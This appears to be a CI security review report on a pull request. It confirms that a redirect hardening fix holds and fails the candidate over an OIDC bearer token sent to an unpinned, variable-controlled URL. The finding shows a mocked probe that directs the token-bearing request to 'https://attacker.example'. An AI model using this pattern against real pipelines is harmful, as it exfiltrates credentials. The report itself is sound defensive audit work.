# NORVANA WATCHTOWER R0 — REAL OBSERVE PROOF DIFFERENT FRESH RE-CHALLENGER FAIL AFTER NW-R0-OBS-02 REMEDIATION

Date: 2026-09-29

Repository: `norrijam405/norvana`  
Pull Request: `#1`  
Branch: `recovery/2026-09-26-norvana-modernization-r0`

## Role disposition

`DIFFERENT_FRESH_RECHALLENGER_FAIL`

This disposition is bound only to the exact immutable remediation candidate below.

I did not build this remediation candidate. I did not repair the defect found in this role. I did not deploy the candidate, execute the real observation proof, or self-certify closure.

## Exact candidate challenged

Commit:

`42674b7682be919b326aba0d7b72d5b3a4df76ef`

Parent:

`74852a99551dc1623eb83253cfb6d5d2b16676c6`

Tree declared by the activation and Builder receipt:

`7a887cb65f54da9809e1e81f148e9d871bff7bc0`

Required Recovery CI:

`36669458901 — SUCCESS`

GitHub Actions job:

`109741119813 — static-verification — SUCCESS`

The CI log independently confirms checkout of exact commit `42674b7682be919b326aba0d7b72d5b3a4df76ef` and Watchtower tests:

`31 PASS / 0 FAIL`

The same run also passed the runtime dependency audit, high-severity gate, current-tree secret regression scan, typecheck, lint with no errors, and production build.

## Re-challenge of NW-R0-OBS-02

The redirect remediation itself survived independent adversarial review.

Confirmed in the exact candidate:

- public-source fetches use `redirect: "manual"`;
- the current URL is validated before each request;
- each redirect `Location` is resolved and validated before the next request;
- approved -> unapproved -> approved is rejected before the unapproved host is requested;
- HTTP downgrade is rejected;
- URL credentials are rejected;
- non-default custom ports are rejected;
- missing and syntactically invalid `Location` values fail closed;
- unsupported 3xx states fail closed;
- redirect depth is capped;
- the final Fetch URL cannot silently differ from the explicitly validated request URL;
- the host set remains `ag.ok.gov`, `ams.usda.gov`, and `www.ams.usda.gov`.

Additional mocked, no-network checks also exercised host-suffix confusion, Unicode/punycode host confusion, percent-encoded dots, protocol-relative redirects, userinfo forms, custom ports, malformed redirect targets, unsupported 3xx states, depth overflow, final-response URL drift, and approved relative redirects.

No real observation request was executed.

## Preserved material finding

`NW-R0-OBS-03 — OBSERVE_PROOF_OIDC_TOKEN_DESTINATION_IS_MUTABLE_AND_UNBOUND`

### Evidence

The dedicated observe-proof workflow obtains its API destination from mutable repository variables:

`.github/workflows/watchtower-observe-proof.yml`

```yaml
env:
  NORVANA_WATCHTOWER_OBSERVE_PROOF_BASE_URL: ${{ vars.NORVANA_WATCHTOWER_OBSERVE_PROOF_BASE_URL }}
  NORVANA_WATCHTOWER_OBSERVE_PROOF_ENABLED: ${{ vars.NORVANA_WATCHTOWER_OBSERVE_PROOF_ENABLED }}
```

Its explicit gate verifies only that the value begins with HTTPS:

```bash
case "${NORVANA_WATCHTOWER_OBSERVE_PROOF_BASE_URL}" in
  https://*) ;;
  *) echo "Observe-proof base URL must be HTTPS."; exit 1 ;;
esac
```

The exact candidate worker independently performs only the same scheme-level check:

`scripts/watchtower-observe-proof.mjs`

```js
if (!baseUrl.startsWith("https://")) fail("Observe-proof base URL must use HTTPS.");
```

After minting the GitHub OIDC token, the worker sends that bearer token in both headers below to the configured base URL:

```js
const authHeaders = {
  "x-vercel-trusted-oidc-idp-token": vercelOidcToken,
  "x-norvana-github-oidc-token": vercelOidcToken,
};

await fetch(`${baseUrl}/api/watchtower/observe-proof/claim`, {
  method: "POST",
  headers: authHeaders,
});
```

There is no exact host, origin, controlled-Preview, or immutable-deployment binding before this credential-bearing request.

Therefore the immutable Git candidate does not determine or constrain the recipient of the OIDC bearer token. If the repository variable drifts to another HTTPS origin, the proof worker sends the token to that origin before any Norvana server-side OIDC validation can occur.

A local adversarial probe with a mocked `fetch` and no network access set the base URL to `https://attacker.example`. The exact worker gate accepted the value and the first request was:

`https://attacker.example/api/watchtower/observe-proof/claim`

with both OIDC-bearing headers populated.

The mocked request was stopped immediately; no real endpoint was contacted.

### Why this is material

The activation explicitly requires dedicated OIDC isolation and current proof binding. A bearer credential used to cross Vercel protection and authenticate the observe-proof worker must not be deliverable to an arbitrary mutable HTTPS destination outside the immutable candidate.

This is also weaker than the already-hardened external harness pattern on `main`, which pins the exact controlled Preview URL in Git and asserts equality before using its OIDC token.

The redirect remediation for `NW-R0-OBS-02` is not rejected here; the candidate fails because the broader required OIDC isolation property does not survive independent re-challenge.

## Preserved surrounding invariants

Static reconciliation of the exact candidate confirmed that queue, claim, and finalization still require current-runtime Control Proof + Worker Proof; exactly one enabled `local-producer-watch` at `OBSERVE` / $0; exactly one active `OBSERVE_PROOF`; no concurrent executable run; dedicated observe-proof OIDC claim checks; zero candidate emission; zero estimated cost; disabled normal queue/executor, fulfillment, supplier connectors, and IgniAqua federation; and `vercel.json -> git.deploymentEnabled=false`.

Those preserved controls do not remove the OIDC destination-binding defect above.

## Final disposition

`DIFFERENT_FRESH_RECHALLENGER_FAIL`

No repair was performed in this role.
